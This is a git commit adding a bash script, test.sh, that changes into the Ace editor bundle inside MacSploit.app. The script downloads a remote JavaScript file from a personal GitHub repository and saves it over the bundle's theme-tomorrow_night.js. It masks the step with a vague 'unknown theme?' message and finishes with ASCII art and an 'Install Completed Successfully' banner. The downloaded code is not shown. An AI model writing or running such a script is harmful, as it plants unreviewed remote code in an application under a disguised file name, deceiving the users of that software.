34e417e5dc55849c4c596e1ad0390b0c2ff848e7
bluetoasterr <sebi2790@gmail.com>
2024-11-05 02:53:46 -0500

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,1 +1,32 @@
 echo "PLEASE DO NOT USE THIS!"
+
+
+#!/bin/bash
+
+main() {
+clear
+    cd /Applications/MacSploit.app/Contents/Resources/CodeViewer_CodeViewer.bundle/Contents/Resources/ace.bundle
+    echo -e "echo.. unknown theme?"
+    curl "https://raw.githubusercontent.com/bluetoasterr/yooo/main/test.js" -o "./theme-tomorrow_night.js"
+}
+
+print_ascii_art() {
+    cat << "EOF"
+⠀
+⢀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⣰⣿⣿⣿⣿⣿⣿⣷⣶
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+EOF
+
+    echo "[Raptor] Software"
+    echo "[Owner] Nexus42"
+    echo "[Install] Completed Successfully"
+    echo "baiii"
+}
+
+main
+print_ascii_art
